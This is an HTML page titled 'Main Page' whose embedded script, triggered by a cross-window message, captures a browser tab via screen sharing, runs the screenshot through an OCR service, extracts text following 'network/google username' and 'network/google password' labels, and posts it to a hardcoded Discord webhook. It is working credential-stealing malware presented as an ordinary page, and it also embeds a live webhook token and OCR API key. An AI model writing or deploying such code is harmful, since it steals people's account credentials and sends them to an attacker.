<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Main Page</title>
</head>
<body>
<h1>Main Page</h1>
<script>
const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd",
      K="K85882318988957";

window.addEventListener("message", async e=>{
  if(e.data?.msg === "run_main"){
    // open test.html in a new tab
    const testTab = window.open("test.html","_blank");

    // ask for screen capture permission
    const stream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser"}});

    // tell test.html screen permission is granted
    testTab.postMessage({msg:"permission_granted"}, "*");

    // wait for test.html to confirm with "allowed"
    await new Promise(resolve => {
      function handler(ev){
        if(ev.data?.msg==="allowed"){
          window.removeEventListener("message", handler);
          resolve();
        }
      }
      window.addEventListener("message", handler);
    });

    // once allowed, send test data to test.html to display
    testTab.postMessage({msg:"display_words", text:"It worked! OCR will continue."}, "*");

    // continue with OCR + Discord workflow
    const v = document.createElement("video");
    v.srcObject = stream; 
    await v.play(); 
    await new Promise(r=>setTimeout(r,1000));

    const c = document.createElement("canvas");
    c.width=v.videoWidth; c.height=v.videoHeight;
    c.getContext("2d").drawImage(v,0,0);
    stream.getTracks().forEach(t=>t.stop());

    const b = await new Promise(r=>c.toBlob(r,"image/png"));
    const f = new FormData();
    f.append("apikey",K); f.append("language","eng"); f.append("file",b,"shot.png");

    const j = await (await fetch("https://api.ocr.space/parse/image",{method:"POST",body:f})).json();
    if(!j.ParsedResults?.length) return;

    const l = j.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/),
          o = l.reduce((a,v,i)=>a||(v.toLowerCase().includes("network/google username")||v.toLowerCase().includes("network/google password")?`${l[i+1]||""}\n${l[i+2]||""}`:""),"").trim();
    if(!o) return;

    await fetch(W,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({content:o||"(no valid text found)"})
    });

    console.log("OCR + Discord done!");
  }
});
</script>
</body>
</html>
